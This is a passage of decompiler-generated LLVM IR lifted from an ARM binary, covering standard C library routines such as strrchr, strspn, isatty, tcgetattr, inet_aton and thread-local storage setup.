  uselistorder i32 %v3_16fc0, { 1, 0 }
  uselistorder i32 %v0_16fc8.pre, { 1, 0 }
  uselistorder i32 %v0_16fc0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_16fb0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_16fe4 = urem i32 %arg2, 256
  store i32 %v1_16fe4, i32* @r4, align 4
  %v2_16fe4 = icmp eq i32 %v1_16fe4, 0
  br i1 %v2_16fe4, label %dec_label_pc_16ff8, label %dec_label_pc_1700c.preheader

dec_label_pc_1700c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_170143 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_16fe4)
  %v2_170185 = icmp eq i32 %v2_170143, 0
  br i1 %v2_170185, label %dec_label_pc_17020, label %dec_label_pc_17004

dec_label_pc_16ff8:                               ; preds = %entry
  %v2_16ffc = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_17024

dec_label_pc_17004:                               ; preds = %dec_label_pc_1700c.preheader, %dec_label_pc_17004
  %v2_170146 = phi i32 [ %v2_17014, %dec_label_pc_17004 ], [ %v2_170143, %dec_label_pc_1700c.preheader ]
  store i32 %v2_170146, i32* @r5, align 4
  %v1_17008 = add i32 %v2_170146, 1
  store i32 %v1_17008, i32* @r0, align 4
  %v0_17010 = load i32, i32* @r4, align 4
  %v2_17014 = call i32 @__GI_strchr(i32 %v1_17008, i32 %v0_17010)
  %v2_17018 = icmp eq i32 %v2_17014, 0
  br i1 %v2_17018, label %dec_label_pc_17020, label %dec_label_pc_17004

dec_label_pc_17020:                               ; preds = %dec_label_pc_17004, %dec_label_pc_1700c.preheader
  %v0_17020 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17024

dec_label_pc_17024:                               ; preds = %dec_label_pc_16ff8, %dec_label_pc_17020
  %storemerge = phi i32 [ %v2_16ffc, %dec_label_pc_16ff8 ], [ %v0_17020, %dec_label_pc_17020 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17014, { 1, 0 }
  uselistorder i32 %v1_17008, { 1, 0 }
  uselistorder i32 %v1_16fe4, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17024, { 1, 0 }
  uselistorder label %dec_label_pc_17004, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_170602 = load i32, i32* @r0, align 4
  %v1_170603 = inttoptr i32 %v0_170602 to i8*
  %v2_170604 = load i8, i8* %v1_170603, align 1
  %v2_170646 = icmp eq i8 %v2_170604, 0
  br i1 %v2_170646, label %dec_label_pc_17070, label %dec_label_pc_17044.preheader

dec_label_pc_1703c:                               ; preds = %dec_label_pc_17044
  %v1_1704c = add i32 %v0_1704c, 1
  %v9_1703c = icmp eq i8 %v0_1703c10.in, %v2_17044
  br i1 %v9_1703c, label %dec_label_pc_17058, label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %dec_label_pc_17044.preheader, %dec_label_pc_1703c
  %v0_1704c = phi i32 [ %tmp, %dec_label_pc_17044.preheader ], [ %v1_1704c, %dec_label_pc_1703c ]
  %v1_17044 = inttoptr i32 %v0_1704c to i8*
  %v2_17044 = load i8, i8* %v1_17044, align 1
  %v2_17048 = icmp eq i8 %v2_17044, 0
  br i1 %v2_17048, label %dec_label_pc_17070, label %dec_label_pc_1703c

dec_label_pc_17058:                               ; preds = %dec_label_pc_1703c
  %v1_17058 = add i32 %v0_17058, 1
  %v1_1705c = add i32 %v0_1705c, 1
  %v1_17060 = inttoptr i32 %v1_1705c to i8*
  %v2_17060 = load i8, i8* %v1_17060, align 1
  %v2_17064 = icmp eq i8 %v2_17060, 0
  br i1 %v2_17064, label %dec_label_pc_17070, label %dec_label_pc_17044.preheader

dec_label_pc_17044.preheader:                     ; preds = %entry, %dec_label_pc_17058
  %v0_1705c = phi i32 [ %v1_1705c, %dec_label_pc_17058 ], [ %v0_170602, %entry ]
  %v0_17058 = phi i32 [ %v1_17058, %dec_label_pc_17058 ], [ 0, %entry ]
  %v0_1703c10.in = phi i8 [ %v2_17060, %dec_label_pc_17058 ], [ %v2_170604, %entry ]
  br label %dec_label_pc_17044

dec_label_pc_17070:                               ; preds = %dec_label_pc_17058, %dec_label_pc_17044, %entry
  %v0_17070 = phi i32 [ 0, %entry ], [ %v0_17058, %dec_label_pc_17044 ], [ %v1_17058, %dec_label_pc_17058 ]
  ret i32 %v0_17070

; uselistorder directives
  uselistorder i8 %v2_17044, { 1, 0 }
  uselistorder i32 %v0_1704c, { 1, 0 }
  uselistorder label %dec_label_pc_17044.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17084 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17084, i32* @r1, align 4
  %v0_17088 = call i32 @__GI_tcgetattr()
  %v1_1708c = sub i32 1, %v0_17088
  %v2_1708c = icmp ult i32 %v0_17088, 2
  br i1 %v2_1708c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1709c = phi i32 [ %v1_1708c, %entry ], [ 0, %bb ]
  ret i32 %v1_1709c

; uselistorder directives
  uselistorder i32 %v0_17088, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_170a0 = load i32, i32* @r4, align 4
  %v6_170a0 = load i32, i32* @r5, align 4
  %v9_170a0 = load i32, i32* @r6, align 4
  %v2_170a8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_170ac = load i32, i32* @r1, align 4
  store i32 %v0_170ac, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_170b8 = load i32, i32* @r0, align 4
  %v3_170b8 = call i32 @ioctl(i32 %v0_170b8, i32 21505, i32 %v2_170a8)
  store i32 %v3_170b8, i32* %r0.global-to-local, align 4
  store i32 %v3_170b8, i32* @r5, align 4
  %v2_170bc = icmp eq i32 %v3_170b8, 0
  br i1 %v2_170bc, label %dec_label_pc_170c4, label %dec_label_pc_17108

dec_label_pc_170c4:                               ; preds = %entry
  %v4_170d0 = zext i8 %tmp to i32
  store i32 %v4_170d0, i32* @ip, align 4
  %v3_170d4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_170d4, i32* @r3, align 4
  %v1_170d8 = load i32, i32* @r4, align 4
  %v2_170d8 = add i32 %v1_170d8, 4
  %v3_170d8 = inttoptr i32 %v2_170d8 to i32*
  %v0_170dc = load i32, i32* %r1.global-to-local, align 4
  %v1_170dc = load i32, i32* @r4, align 4
  %v2_170dc = add i32 %v1_170dc, 8
  %v3_170dc = inttoptr i32 %v2_170dc to i32*
  store i32 %v0_170dc, i32* %v3_170dc, align 4
  %v0_170e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_170e0 = load i32, i32* @r4, align 4
  %v2_170e0 = add i32 %v1_170e0, 12
  %v3_170e0 = inttoptr i32 %v2_170e0 to i32*
  store i32 %v0_170e0, i32* %v3_170e0, align 4
  %v2_170e4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_170e4, i32* @r1, align 4
  %v1_170ec = load i32, i32* @r4, align 4
  %v2_170ec = inttoptr i32 %v1_170ec to i32*
  store i32 %v3_170d4, i32* %v2_170ec, align 4
  %v0_170f0 = load i32, i32* @ip, align 4
  %v1_170f0 = trunc i32 %v0_170f0 to i8
  %v2_170f0 = load i32, i32* @r4, align 4
  %v3_170f0 = add i32 %v2_170f0, 16
  %v4_170f0 = inttoptr i32 %v3_170f0 to i8*
  store i8 %v1_170f0, i8* %v4_170f0, align 1
  %v0_170f4 = load i32, i32* @r4, align 4
  %v1_170f4 = add i32 %v0_170f4, 17
  store i32 %v1_170f4, i32* %r0.global-to-local, align 4
  %v4_170f8 = call i32 @__GI_mempcpy(i32 %v1_170f4, i32 %v2_170e4, i32 19, i32 %v3_170d4)
  store i32 %v4_170f8, i32* %r0.global-to-local, align 4
  %v0_170fc = load i32, i32* @r5, align 4
  store i32 %v0_170fc, i32* %r1.global-to-local, align 4
  %v3_17104 = inttoptr i32 %v4_170f8 to i8*
  %v4_17104 = call i32 @__GI_memset(i8* %v3_17104, i32 %v0_170fc, i32 13)
  store i32 %v4_17104, i32* %r0.global-to-local, align 4
  %v0_17108.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17108

dec_label_pc_17108:                               ; preds = %entry, %dec_label_pc_170c4
  %v0_17108 = phi i32 [ %v3_170b8, %entry ], [ %v0_17108.pre, %dec_label_pc_170c4 ]
  store i32 %v0_17108, i32* %r0.global-to-local, align 4
  store i32 %v3_170a0, i32* @r4, align 4
  store i32 %v6_170a0, i32* @r5, align 4
  store i32 %v9_170a0, i32* @r6, align 4
  ret i32 %v0_17108

; uselistorder directives
  uselistorder i32 %v0_17108, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 15, 1, 4, 5, 16, 6, 17, 7, 8, 9, 10, 2, 18, 3, 19, 20, 11, 21, 12, 22, 23, 24, 0, 25, 13, 26, 14 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17108, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1711c = load i32, i32* @r4, align 4
  store i32 %v3_1711c, i32* %stack_var_-28, align 4
  %v0_17124 = load i32, i32* @r0, align 4
  %v2_17124 = icmp eq i32 %v0_17124, 0
  %v0_1712c = load i32, i32* @r1, align 4
  br i1 %v2_17124, label %dec_label_pc_17200, label %dec_label_pc_17134

dec_label_pc_17134:                               ; preds = %entry
  br label %dec_label_pc_1714c

dec_label_pc_1714c:                               ; preds = %dec_label_pc_17134, %dec_label_pc_171c4
  %v1_171c4 = phi i32 [ 0, %dec_label_pc_17134 ], [ %v5_171c4, %dec_label_pc_171c4 ]
  %v0_171c8 = phi i32 [ 1, %dec_label_pc_17134 ], [ %v1_171c8, %dec_label_pc_171c4 ]
  %v0_1714c = phi i32 [ %v0_17124, %dec_label_pc_17134 ], [ %v0_1714c13, %dec_label_pc_171c4 ]
  %v1_1714c = inttoptr i32 %v0_1714c to i8*
  %v2_1714c = load i8, i8* %v1_1714c, align 1
  %v3_1714c = zext i8 %v2_1714c to i32
  %v4_17150 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 276) to i32*), align 4
  %v2_17154 = mul nuw nsw i32 %v3_1714c, 2
  %v2_17158 = add i32 %v2_17154, %v4_17150
  %v3_17158 = inttoptr i32 %v2_17158 to i16*
  %v4_17158 = load i16, i16* %v3_17158, align 2
  %v1_1715c = and i16 %v4_17158, 8
  %v2_1715c = icmp eq i16 %v1_1715c, 0
  br i1 %v2_1715c, label %dec_label_pc_17200, label %dec_label_pc_17164

dec_label_pc_17164:                               ; preds = %dec_label_pc_1714c
  br label %dec_label_pc_17184

dec_label_pc_1716c:                               ; preds = %dec_label_pc_17184
  %v2_1716c = mul i32 %v0_171c4, 10
  %v1_17170 = add i32 %v2_1716c, -48
  %v2_17174 = add i32 %v3_17184, %v1_17170
  %v8_1717c = icmp sgt i32 %v2_17174, 255
  br i1 %v8_1717c, label %dec_label_pc_17200, label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_1716c
  %v1_17180 = add i32 %v0_171b4, 1
  store i32 %v1_17180, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17184

dec_label_pc_17184:                               ; preds = %dec_label_pc_17164, %dec_label_pc_17180
  %v0_171c4 = phi i32 [ 0, %dec_label_pc_17164 ], [ %v2_17174, %dec_label_pc_17180 ]
  %v0_171b4 = phi i32 [ %v0_1714c, %dec_label_pc_17164 ], [ %v1_17180, %dec_label_pc_17180 ]
  %v1_17184 = inttoptr i32 %v0_171b4 to i8*
  %v2_17184 = load i8, i8* %v1_17184, align 1
  %v3_17184 = zext i8 %v2_17184 to i32
  %v2_17188 = mul nuw nsw i32 %v3_17184, 2
  %v2_1718c = add i32 %v2_17188, %v4_17150
  %v3_1718c = inttoptr i32 %v2_1718c to i16*
  %v4_1718c = load i16, i16* %v3_1718c, align 2
  %v6_1718c = zext i16 %v4_1718c to i32
  %v1_17190 = and i32 %v6_1718c, 8
  %v2_17190 = icmp eq i32 %v1_17190, 0
  br i1 %v2_17190, label %dec_label_pc_17198, label %dec_label_pc_1716c

dec_label_pc_17198:                               ; preds = %dec_label_pc_17184
  %v7_17198 = icmp eq i32 %v0_171c8, 4
  br i1 %v7_17198, label %dec_label_pc_171b0, label %dec_label_pc_171a0

dec_label_pc_171a0:                               ; preds = %dec_label_pc_17198
  %v7_171a0 = icmp eq i8 %v2_17184, 46
  br i1 %v7_171a0, label %dec_label_pc_171a8, label %dec_label_pc_17200

dec_label_pc_171a8:                               ; preds = %dec_label_pc_171a0
  %v1_171a8 = add i32 %v0_171b4, 1
  store i32 %v1_171a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171c4

dec_label_pc_171b0:                               ; preds = %dec_label_pc_17198
  %v2_171b0 = icmp eq i8 %v2_17184, 0
  %v1_171b4 = add i32 %v0_171b4, 1
  store i32 %v1_171b4, i32* %r0.global-to-local, align 4
  br i1 %v2_171b0, label %dec_label_pc_171c4, label %dec_label_pc_171bc

dec_label_pc_171bc:                               ; preds = %dec_label_pc_171b0
  %v1_171bc = and i32 %v6_1718c, 32
  %v2_171bc = icmp eq i32 %v1_171bc, 0
  br i1 %v2_171bc, label %dec_label_pc_17200, label %dec_label_pc_171c4

dec_label_pc_171c4:                               ; preds = %dec_label_pc_171bc, %dec_label_pc_171b0, %dec_label_pc_171a8
  %v0_1714c13 = phi i32 [ %v1_171b4, %dec_label_pc_171bc ], [ %v1_171b4, %dec_label_pc_171b0 ], [ %v1_171a8, %dec_label_pc_171a8 ]
  %v4_171c4 = mul i32 %v1_171c4, 256
  %v5_171c4 = or i32 %v0_171c4, %v4_171c4
  %v1_171c8 = add nuw nsw i32 %v0_171c8, 1
  %v7_171d0 = icmp slt i32 %v1_171c8, 5
  br i1 %v7_171d0, label %dec_label_pc_1714c, label %dec_label_pc_171d4

dec_label_pc_171d4:                               ; preds = %dec_label_pc_171c4
  %v2_171d4 = icmp eq i32 %v0_1712c, 0
  br i1 %v2_171d4, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_171d4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17204

bb:                                               ; preds = %dec_label_pc_171d4
  %v4_171d8 = udiv i32 %v5_171c4, 16777216
  %v2_171dc = udiv i32 %v5_171c4, 256
  %v5_171e0 = and i32 %v2_171dc, 65280
  %v2_171e4 = and i32 %v5_171c4, 65280
  %v5_171e8 = mul nuw nsw i32 %v2_171e4, 256
  %v5_171ec = mul i32 %v0_171c4, 16777216
  %v6_171e0 = or i32 %v4_171d8, %v5_171ec
  %v6_171e8 = or i32 %v6_171e0, %v5_171e0
  %v6_171ec = or i32 %v6_171e8, %v5_171e8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_171f8 = inttoptr i32 %v0_1712c to i32*
  store i32 %v6_171ec, i32* %v3_171f8, align 4
  %v2_17204.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17208.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17204

dec_label_pc_17200:                               ; preds = %dec_label_pc_171a0, %dec_label_pc_171bc, %dec_label_pc_1714c, %dec_label_pc_1716c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17204

dec_label_pc_17204:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17200
  %v1_17208 = phi i32 [ %v1_17208.pre, %bb ], [ 0, %dec_label_pc_17200 ], [ 1, %.thread8.thread ]
  %v2_17204 = phi i32 [ %v2_17204.pre, %bb ], [ %v3_1711c, %dec_label_pc_17200 ], [ %v3_1711c, %.thread8.thread ]
  store i32 %v2_17204, i32* @r4, align 4
  ret i32 %v1_17208

; uselistorder directives
  uselistorder i32 %v1_171c8, { 1, 0 }
  uselistorder i32 %v5_171c4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_171b4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 70, 0, 7, 1, 2, 3, 50, 51, 8, 9, 4, 10, 52, 53, 41, 11, 12, 13, 14, 15, 44, 45, 42, 43, 54, 55, 56, 48, 49, 46, 47, 57, 58, 59, 16, 17, 18, 19, 20, 60, 61, 21, 22, 23, 62, 24, 25, 63, 26, 27, 28, 29, 64, 30, 31, 65, 32, 33, 34, 35, 66, 67, 36, 37, 38, 39, 40, 68, 5, 69, 6, 71 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 5, 17, 6, 18, 19, 20, 21, 22 }
  uselistorder i32 276, { 1, 0 }
  uselistorder label %dec_label_pc_17204, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17200, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17184, { 1, 0 }
  uselistorder label %dec_label_pc_1714c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_17220 = load i32, i32* @r4, align 4
  store i32 %v3_17220, i32* %stack_var_-16, align 4
  %v4_17224 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1722c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_17234 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 36) to i32*), align 4
  store i32 %v4_17234, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_1723c = inttoptr i32 %v4_17224 to i32*
  %v2_1723c = load i32, i32* %v1_1723c, align 4
  %v4_17240 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 52) to i32*), align 4
  store i32 %v4_17240, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_17248 = add i32 %v2_1723c, 15
  %v4_1724c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 144) to i32*), align 4
  store i32 %v4_1724c, i32* @ip, align 4
  %v1_17250 = load i32, i32* @r0, align 4
  %v2_17250 = add i32 %v1_17250, %v1_17248
  %v1_17254 = inttoptr i32 %v4_1722c to i32*
  %v2_17254 = load i32, i32* %v1_17254, align 4
  store i32 %v2_17254, i32* %r3.global-to-local, align 4
  %v1_17258 = and i32 %v2_17250, -16
  store i32 %v1_17258, i32* %v1_1723c, align 4
  %v0_17260 = load i32, i32* @r0, align 4
  %v1_17260 = load i32, i32* %r4.global-to-local, align 4
  %v2_17260 = inttoptr i32 %v1_17260 to i32*
  store i32 %v0_17260, i32* %v2_17260, align 4
  %v0_17264 = load i32, i32* @r1, align 4
  %v1_17264 = load i32, i32* %lr.global-to-local, align 4
  %v2_17264 = inttoptr i32 %v1_17264 to i32*
  store i32 %v0_17264, i32* %v2_17264, align 4
  %v0_17268 = load i32, i32* %r3.global-to-local, align 4
  %v1_17268 = load i32, i32* @ip, align 4
  %v2_17268 = inttoptr i32 %v1_17268 to i32*
  store i32 %v0_17268, i32* %v2_17268, align 4
  %v2_1726c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1726c, i32* %r4.global-to-local, align 4
  %v1_17270 = load i32, i32* @r0, align 4
  ret i32 %v1_17270

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17278(i32 %arg1) local_unnamed_addr {
dec_label_pc_17278:
  %v0_17278 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17278, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17278
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17278, %bb
  %v4_17288 = phi i32 [ %arg1, %dec_label_pc_17278 ], [ 0, %bb ]
  ret i32 %v4_17288

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r3.global-to-local, align 4
  %v4_1729c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 84) to i32*), align 4
  store i32 %v4_1729c, i32* @lr, align 4
  %v4_172a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_172c8 = inttoptr i32 %v4_172a8 to i32*
  store i32 1, i32* %v2_172c8, align 4
  %v0_172cc = load i32, i32* %r3.global-to-local, align 4
  %v1_172cc = load i32, i32* @lr, align 4
  %v2_172cc = inttoptr i32 %v1_172cc to i32*
  store i32 %v0_172cc, i32* %v2_172cc, align 4
  %v0_172d0 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_172e8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_172e8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_172e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_172e8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_172e8
  %v2_172e8 = load i32, i32* @r4, align 4
  %v8_172e8 = ashr i32 %v2_172e8, %tmp
  %v9_172e8 = and i32 %v8_172e8, %tmp
  %v2_172ec = load i32, i32* @ip, align 4
  %v8_172ec = lshr i32 %v2_172ec, %v9_172e8
  %v9_172ec = and i32 %v8_172ec, %v9_172e8
  store i32 %v9_172ec, i32* %r0.global-to-local, align 4
  %v4_172f0 = inttoptr i32 %v9_172ec to i32*
  store i32 %arg2, i32* %v4_172f0, align 4
  %v5_172f0 = load i32, i32* @ip, align 4
  %v6_172f0 = load i32, i32* %r0.global-to-local, align 4
  %v7_172f0 = sub i32 %v6_172f0, %v5_172f0
  store i32 %v7_172f0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_172e8, %bb
  %v8_172f0 = phi i32 [ %tmp, %dec_label_pc_172e8 ], [ %v7_172f0, %bb ]
  ret i32 %v8_172f0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_172fc = call i32 @__aeabi_read_tp()
  %v1_17300 = inttoptr i32 %v0_172fc to i32*
  %v2_17300 = load i32, i32* %v1_17300, align 4
  %v1_17304 = add i32 %arg1, 4
  %v2_17304 = inttoptr i32 %v1_17304 to i32*
  %v3_17304 = load i32, i32* %v2_17304, align 4
  %v1_17308 = add i32 %v2_17300, 8
  %v2_17308 = inttoptr i32 %v1_17308 to i32*
  %v3_17308 = load i32, i32* %v2_17308, align 4
  %v2_1730c = add i32 %v3_17308, %v3_17304
  ret i32 %v2_1730c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17318 = load i32, i32* @r4, align 4
  store i32 %v3_17318, i32* %stack_var_-36, align 4
  %v6_17318 = load i32, i32* @r5, align 4
  %v15_17318 = load i32, i32* @r8, align 4
  %v18_17318 = load i32, i32* @sb, align 4
  %v21_17318 = load i32, i32* @sl, align 4
  %v24_17318 = load i32, i32* @fp, align 4
  %v27_17318 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %sl.global-to-local, align 4
  %v4_17328 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 104) to i32*), align 4
  store i32 %v4_17328, i32* %r3.global-to-local, align 4
  %v1_1732c = inttoptr i32 %v4_17328 to i32*
  %v2_1732c = load i32, i32* %v1_1732c, align 4
  store i32 %v2_1732c, i32* %r2.global-to-local, align 4
  %v2_17330 = icmp eq i32 %v2_1732c, 0
  %v0_17338 = load i32, i32* %r0.global-to-local, align 4
  %v0_1733c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1733c, i32* %ip.global-to-local, align 4
  br i1 %v2_17330, label %dec_label_pc_17504, label %dec_label_pc_17344

dec_label_pc_17344:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_17348 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 156) to i32*), align 4
  store i32 %v4_17348, i32* @lr, align 4
  store i32 %v2_1732c, i32* %r1.global-to-local, align 4
  %v1_17390 = inttoptr i32 %v4_17348 to i32*
  %v2_1739061 = load i32, i32* %v1_17390, align 4
  %v4_1739462 = mul i32 %v2_1739061, 32
  %v5_1739463 = add i32 %v4_1739462, %v2_1732c
  store i32 %v5_1739463, i32* %r3.global-to-local, align 4
  %v3_1739865 = icmp ult i32 %v2_1732c, %v5_1739463
  br i1 %v3_1739865, label %dec_label_pc_17354, label %dec_label_pc_17504.loopexit

dec_label_pc_17354:                               ; preds = %dec_label_pc_17344, %dec_label_pc_1738c
  %v0_1736c66 = phi i32 [ %v1_1738c, %dec_label_pc_1738c ], [ %v2_1732c, %dec_label_pc_17344 ]
  %v1_17354 = inttoptr i32 %v0_1736c66 to i32*
  %v2_17354 = load i32, i32* %v1_17354, align 4
  store i32 %v2_17354, i32* %r3.global-to-local, align 4
  %v7_17358 = icmp eq i32 %v2_17354, 7
  br i1 %v7_17358, label %dec_label_pc_17360, label %dec_label_pc_1738c

dec_label_pc_17360:                               ; preds = %dec_label_pc_17354
  %v1_17360 = add i32 %v0_1736c66, 20
  %v2_17360 = inttoptr i32 %v1_17360 to i32*
  %v3_17360 = load i32, i32* %v2_17360, align 4
  store i32 %v3_17360, i32* %r3.global-to-local, align 4
  %v1_17364 = add i32 %v0_1736c66, 28
  %v2_17364 = inttoptr i32 %v1_17364 to i32*
  %v3_17364 = load i32, i32* %v2_17364, align 4
  store i32 %v3_17364, i32* @r6, align 4
  %v1_1736c = add i32 %v0_1736c66, 16
  %v2_1736c = inttoptr i32 %v1_1736c to i32*
  %v3_1736c = load i32, i32* %v2_1736c, align 4
  store i32 %v3_1736c, i32* %r3.global-to-local, align 4
  %v1_17370 = add i32 %v0_1736c66, 8
  %v2_17370 = inttoptr i32 %v1_17370 to i32*
  %v3_17370 = load i32, i32* %v2_17370, align 4
  store i32 %v3_17370, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17364, %v0_1733c
  %v0_1733c.v3_17364 = select i1 %tmp78, i32 %v0_1733c, i32 %v3_17364
  store i32 %v0_1733c.v3_17364, i32* %fp.global-to-local, align 4
  %v2_173a8 = icmp eq i32 %v3_17364, 0
  br i1 %v2_173a8, label %dec_label_pc_173d0, label %bb

dec_label_pc_1738c:                               ; preds = %dec_label_pc_17354
  %v1_1738c = add i32 %v0_1736c66, 32
  store i32 %v1_1738c, i32* %r1.global-to-local, align 4
  %v2_17390 = load i32, i32* %v1_17390, align 4
  %v4_17394 = mul i32 %v2_17390, 32
